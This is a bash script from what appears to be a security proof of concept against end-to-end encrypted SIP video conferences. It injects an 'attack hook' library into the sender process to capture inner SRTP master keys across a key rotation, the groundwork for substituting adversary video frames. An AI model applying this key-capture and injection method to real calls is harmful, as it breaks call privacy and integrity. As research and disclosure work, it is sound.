#!/usr/bin/env bash
# Diagnostic harness: observe-only run of the per-packet ambiguous-
# ciphertext hook. Identical scenario to debug_h264_phase1_key_divergence.sh
# but sender's process gets DYLD_INSERT_LIBRARIES=libattack_hook.dylib
# in OBSERVE mode (ATTACK_HOOK_ARM unset). The hook does not modify
# any wire bytes; it only logs which interpose entries fire.
#
# What we want to see in /tmp/sender.log:
#   [adversary-nals] loaded NN NALs from ...
#   [attack-hook] loaded (interposing ...)
#   [attack-hook] inner_send_key #1 suite=12 ...     ← inner master key captured
#   [attack-hook] srtp_create -> 0x...  tagged as INNER SEND
#   [attack-hook] srtp_protect[INNER observe] #1 ssrc=... seq=...
#   [attack-hook] inner_send_key #2 ...              ← key rotation (T+20s)
#   [attack-hook] (K_old also held — attack window OPEN)
#
# If the inner_send_key line fires but srtp_create / srtp_protect lines
# do NOT, that means libsrtp's symbols are internally direct-bound
# inside libmediastreamer2 (static link) and DYLD_INTERPOSE can't catch
# them — we'd need to patch ms_srtp.cpp directly (out of scope for the
# observation phase).

set -euo pipefail

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${POC_DIR}"
# shellcheck disable=SC1091
source "${POC_DIR}/scripts/common.sh"

HOOK_DYLIB="${POC_DIR}/attack/hook/libattack_hook.dylib"
HOOK_VIDEO="${POC_DIR}/src-video/video_01_main_1920x1440.h265"
ARM_FILE=/tmp/poc_blocklist_arm.flag

if [[ ! -f "${HOOK_DYLIB}" ]]; then
    echo "[-] hook dylib missing — run 'make' in attack/hook/ first" >&2
    exit 1
fi
if [[ ! -f "${HOOK_VIDEO}" ]]; then
    echo "[-] adversary video missing: ${HOOK_VIDEO}" >&2
    exit 1
fi

pkill -9 -f "streamer" 2>/dev/null || true
sleep 1
rm -f /tmp/focus.log /tmp/sender.log build/focus.uri "${ARM_FILE}"

# shellcheck disable=SC1091
source build/envrc

EKT_NOTIFY_BLOCKLIST="${SIP_RECV_A_USER}" \
EKT_NOTIFY_BLOCKLIST_ARM_FILE="${ARM_FILE}" \
python -m streamer.focus \
    --sip-uri "${SIP_FOCUS_URI}" \
    --sip-password-file .sip-password-focus \
    --codec h264 \
    --log-level INFO > /tmp/focus.log 2>&1 &
disown

until grep -q "focus is ready" /tmp/focus.log 2>/dev/null; do sleep 1; done
echo "[+] focus ready: $(cat build/focus.uri)"

echo "[+] launching sender with libattack_hook.dylib (OBSERVE-ONLY)"
echo "    hook video : ${HOOK_VIDEO}"
echo "    arm mode   : OFF (no substitution)"

DYLD_INSERT_LIBRARIES="${HOOK_DYLIB}" \
ATTACK_HOOK_VIDEO="${HOOK_VIDEO}" \
python -m streamer \
    --create --security-level e2ee \
    --codec h264 \
    --video-file src-video/video_02_anonymous.mp4 \
    --sip-uri "${SIP_SENDER_URI}" \
    --sip-password-file .sip-password \
    --conference-factory-uri-file build/focus.uri \
    --lime-server https://lime.linphone.org/lime-server/lime-server.php \
    --invite "${SIP_RECV_A_URI}" \
    --invite "${SIP_RECV_B_URI}" \
    --rotate-after 20 \
    --rotate-arm-file "${ARM_FILE}" \
    --log-level INFO > /tmp/sender.log 2>&1 &
disown

cat <<EOF

=========================================================================
  Diagnostic — H.264 hook injection into sender (observe-only)
=========================================================================

  Answer the call on receiver A AND receiver B. The hook is in OBSERVE-ONLY mode
  so the conference should behave exactly like debug_h264_phase1_key_divergence.sh:
  receiver A's video freezes after T+20 s as in the key-divergence baseline.

  Run for ~40 s, then stop:
      pkill -9 -f streamer

  Live tail of hook events:
      tail -F /tmp/sender.log | grep -E 'attack-hook|adversary-nals'

  After stopping, summarise hook activity:
      grep -E 'attack-hook|adversary-nals' /tmp/sender.log | head -40

  Interpose-fire matrix to confirm (in /tmp/sender.log):
    [+] [attack-hook] loaded ...                          ← ctor
    [+] [adversary-nals] loaded NN NALs                   ← stream parsed
    [+] [attack-hook] inner_send_key ...                  ← K capture works
    [?] [attack-hook] srtp_create -> ... tagged as INNER  ← needs cross-image binding
    [?] [attack-hook] srtp_protect[INNER observe] ...     ← needs cross-image binding

  If both [?] lines fire, the hook-observe path is healthy. If only
  the inner_send_key line fires, we need to add a ms_srtp.cpp patch to
  expose the inner srtp_protect call to interpose.
=========================================================================
EOF
